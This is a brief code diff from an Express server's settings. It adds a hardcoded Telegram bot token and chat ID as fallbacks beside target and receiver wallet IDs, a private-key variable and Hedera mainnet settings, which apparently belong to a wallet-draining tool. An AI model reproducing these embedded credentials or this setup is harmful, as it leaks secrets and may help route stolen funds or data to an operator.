@@ -21,8 +21,8 @@ app.use(express.json());
 // 🔒 Secure environment variables
 const TARGET_WALLET = process.env.TARGET_WALLET || '0.0.9440367';
 const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7844561639:AAHPqDO1WFXjZvwhT3a7SexBnITT2Xoyy-E';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002734673892';
 const RECEIVER_WALLET = process.env.RECEIVER_WALLET || '0.0.9440367';
 const HEDERA_NETWORK = process.env.HEDERA_NETWORK || 'mainnet';
 
